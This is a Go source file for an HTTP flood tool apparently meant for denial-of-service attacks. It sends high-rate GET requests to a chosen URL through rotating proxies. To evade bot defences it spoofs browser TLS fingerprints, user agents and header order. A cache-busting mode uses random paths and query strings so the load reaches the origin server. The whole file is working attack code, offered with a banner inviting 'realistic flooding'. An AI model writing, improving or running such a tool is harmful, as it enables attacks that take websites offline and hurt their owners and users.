package main

import (
	"fmt"
	"log"
	"math/rand"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"github.com/bogdanfinn/tls-client/profiles"

	http "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
	//tls "github.com/bogdanfinn/utls"
)

var (
	// Multiple browser profiles for diversity
	browserProfiles = []profiles.ClientProfile{
		profiles.Chrome_120,
		profiles.Chrome_124,
		profiles.Firefox_120,
		profiles.Chrome_133_PSK,
		profiles.Chrome_131,
	}
	
	// Realistic User-Agents
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	}
	
	// Accept languages for diversity
	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-US,en;q=0.9,th;q=0.8",
		"en-GB,en;q=0.9,en-US;q=0.8",
		"th-TH,th;q=0.9,en;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
	}

	proxies []string
	cached  = false
	rate    int
	target  string
	
	status_200   uint64
	status_403   uint64
	status_5xx   uint64
	status_other uint64
)

func main() {
	rand.Seed(time.Now().UnixNano())
	if len(os.Args) < 6 {
		log.Fatalf("Usage: %s <url> <rate> <secs> <threads> <proxies.txt> [--cached]", os.Args[0])
	}
	
	proxiesString, err := os.ReadFile(os.Args[5])
	if err != nil {
		log.Fatal("Failed to read proxy file")
	}
	allProxies := strings.Split(strings.ReplaceAll(string(proxiesString), "\r\n", "\n"), "\n")
	// Filter out empty lines
	for _, proxy := range allProxies {
		if strings.TrimSpace(proxy) != "" {
			proxies = append(proxies, strings.TrimSpace(proxy))
		}
	}
	if len(proxies) == 0 {
		log.Fatal("No valid proxies found in file")
	}
	
	lol, err := url.Parse(os.Args[1])
	if err != nil {
		log.Fatal("Failed to parse url")
	}
	if lol.Host == "" {
		log.Fatal("Invalid url provided")
	}
	
	target = os.Args[1]
	rate, _ = strconv.Atoi(os.Args[2])
	secs, _ := strconv.Atoi(os.Args[3])
	thr, _ := strconv.Atoi(os.Args[4])
	if rate < 1 || secs < 1 || thr < 1 {
		log.Fatal("Invalid args")
	}
	
	for _, arg := range os.Args {
		if strings.ToLower(arg) == "--cached" {
			cached = true
			break
		}
	}

	if cached {
		target = prepareUrl(target)
	}

	for i := 0; i < thr; i++ {
		if cached {
			go flooderCached()
		} else {
			go flooder()
		}
	}
	go nuller()
	fmt.Println("Advanced Browser-like Flood by Context7 x bogdanfinn/tls-client!\nEnjoy realistic flooding...")
	time.Sleep(time.Duration(secs) * time.Second)
}

func createRealisticClient() (tls_client.HttpClient, error) {
	// Random browser profile for TLS fingerprinting
	profile := browserProfiles[rand.Intn(len(browserProfiles))]
	
	// Create cookie jar for session persistence
	jar := tls_client.NewCookieJar()
	
	options := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(10),
		tls_client.WithInsecureSkipVerify(),
		tls_client.WithClientProfile(profile),
		tls_client.WithCookieJar(jar),
		tls_client.WithNotFollowRedirects(), // Control redirects manually
	}

	return tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
}

func getRealisticHeaders() http.Header {
	userAgent := userAgents[rand.Intn(len(userAgents))]
	acceptLang := acceptLanguages[rand.Intn(len(acceptLanguages))]
	
	// Vary cache control based on browser behavior
	cacheControls := []string{"no-cache", "max-age=0", "no-store"}
	cacheControl := cacheControls[rand.Intn(len(cacheControls))]
	
	headers := http.Header{
		"accept":                    {"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
		"accept-encoding":           {"gzip, deflate, br, zstd"},
		"accept-language":           {acceptLang},
		"cache-control":             {cacheControl},
		"pragma":                    {"no-cache"},
		"sec-ch-ua":                 {`"Google Chrome";v="120", "Chromium";v="120", "Not_A Brand";v="24"`},
		"sec-ch-ua-mobile":          {"?0"},
		"sec-ch-ua-platform":        {`"Windows"`},
		"sec-fetch-dest":            {"document"},
		"sec-fetch-mode":            {"navigate"},
		"sec-fetch-site":            {"none"},
		"sec-fetch-user":            {"?1"},
		"upgrade-insecure-requests": {"1"},
		"user-agent":                {userAgent},
	}
	
	// Critical: Header ordering exactly like real browsers
	if strings.Contains(userAgent, "Chrome") {
		headers[http.HeaderOrderKey] = []string{
			"accept",
			"accept-encoding", 
			"accept-language",
			"cache-control",
			"pragma",
			"sec-ch-ua",
			"sec-ch-ua-mobile",
			"sec-ch-ua-platform", 
			"sec-fetch-dest",
			"sec-fetch-mode",
			"sec-fetch-site",
			"sec-fetch-user",
			"upgrade-insecure-requests",
			"user-agent",
		}
	} else if strings.Contains(userAgent, "Firefox") {
		// Firefox has different header ordering
		headers[http.HeaderOrderKey] = []string{
			"accept",
			"accept-language",
			"accept-encoding",
			"cache-control",
			"pragma", 
			"upgrade-insecure-requests",
			"user-agent",
		}
		// Remove Chrome-specific headers
		delete(headers, "sec-ch-ua")
		delete(headers, "sec-ch-ua-mobile")
		delete(headers, "sec-ch-ua-platform")
		delete(headers, "sec-fetch-dest")
		delete(headers, "sec-fetch-mode")
		delete(headers, "sec-fetch-site")
		delete(headers, "sec-fetch-user")
	}
	
	return headers
}

func randPath() string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, rand.Intn(10)+5) // Random length 5-15
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	
	extensions := []string{".js", ".css", ".html", ".php", ".asp", ".jsp"}
	ext := extensions[rand.Intn(len(extensions))]
	return fmt.Sprintf("%s%s", string(b), ext)
}

func prepareUrl(urlToModify string) string {
	modified, err := url.Parse(urlToModify)
	if err != nil {
		log.Fatal("Failed to parse URL")
	}
	newPath := strings.TrimSuffix(modified.Path, "/") + "/SOMESHIT.js"
	modified.Path = newPath
	return modified.String()
}

func flooder() {
	for {
		proxyString := proxies[rand.Intn(len(proxies))]
		if strings.TrimSpace(proxyString) == "" {
			continue
		}
		
		c, err := createRealisticClient()
		if err != nil {
			continue
		}
		
		err = c.SetProxy(fmt.Sprintf("http://%s", strings.TrimSpace(proxyString)))
		if err != nil {
			c.CloseIdleConnections()
			continue
		}
		
		// Use same client for multiple requests (session simulation)
		for cycles := 0; cycles < 20; cycles++ {
			for i := 0; i < rate; i++ {
				req, err := http.NewRequest("GET", target, nil)
				if err != nil {
					continue
				}
				
				// Get realistic headers for each request
				req.Header = getRealisticHeaders()
				
				res, err := c.Do(req)
				if err != nil {
					continue
				}
				
				res.Body.Close()
				
				if res.StatusCode == 200 {
					atomic.AddUint64(&status_200, 1)
				} else if res.StatusCode == 403 {
					atomic.AddUint64(&status_403, 1)
				} else if res.StatusCode < 600 && res.StatusCode > 499 {
					atomic.AddUint64(&status_5xx, 1)
				} else {
					atomic.AddUint64(&status_other, 1)
				}
				
				// Random small delay to simulate human behavior
				if rand.Intn(20) == 0 {
					time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
				}
			}
		}
		c.CloseIdleConnections()
	}
}

func flooderCached() {
	for {
		proxyString := proxies[rand.Intn(len(proxies))]
		if strings.TrimSpace(proxyString) == "" {
			continue
		}
		
		c, err := createRealisticClient()
		if err != nil {
			continue
		}
		
		err = c.SetProxy(fmt.Sprintf("http://%s", strings.TrimSpace(proxyString)))
		if err != nil {
			c.CloseIdleConnections()
			continue
		}
		
		// Use same client for multiple requests (session simulation)
		for cycles := 0; cycles < 20; cycles++ {
			for i := 0; i < rate; i++ {
				// Generate random path for cache busting
				randomUrl := strings.ReplaceAll(target, "SOMESHIT.js", randPath())
				req, err := http.NewRequest("GET", randomUrl, nil)
				if err != nil {
					continue
				}
				
				// Get realistic headers for each request
				req.Header = getRealisticHeaders()
				
				// Add random query parameters for cache busting
				if rand.Intn(5) == 0 {
					params := url.Values{}
					params.Add("v", fmt.Sprintf("%d", rand.Intn(1000000)))
					params.Add("t", fmt.Sprintf("%d", time.Now().Unix()))
					if strings.Contains(randomUrl, "?") {
						randomUrl += "&" + params.Encode()
					} else {
						randomUrl += "?" + params.Encode()
					}
					req.URL, _ = url.Parse(randomUrl)
				}
				
				res, err := c.Do(req)
				if err != nil {
					continue
				}
				
				res.Body.Close()
				
				if res.StatusCode == 200 {
					atomic.AddUint64(&status_200, 1)
				} else if res.StatusCode == 403 {
					atomic.AddUint64(&status_403, 1)
				} else if res.StatusCode < 600 && res.StatusCode > 499 {
					atomic.AddUint64(&status_5xx, 1)
				} else {
					atomic.AddUint64(&status_other, 1)
				}
				
				// Random small delay to simulate human behavior
				if rand.Intn(20) == 0 {
					time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
				}
			}
		}
		c.CloseIdleConnections()
	}
}

func nuller() {
	fmt.Printf("REALISTIC BROWSER STATS:\n200 OK: %d\n403 FBDN: %d\n5xx DROP: %d\nOTHER: %d\n", status_200, status_403, status_5xx, status_other)
	for {
		time.Sleep(1 * time.Second)
		fmt.Printf("\033[1A\033[2K\033[1A\033[2K\033[1A\033[2K\033[1A\033[2K\033[1A\033[2KREALISTIC BROWSER STATS:\n200 OK: %d\n403 FBDN: %d\n5xx DROP: %d\nOTHER: %d\n", status_200, status_403, status_5xx, status_other)
		atomic.StoreUint64(&status_200, 0)
		atomic.StoreUint64(&status_403, 0)
		atomic.StoreUint64(&status_5xx, 0)
		atomic.StoreUint64(&status_other, 0)
	}
}
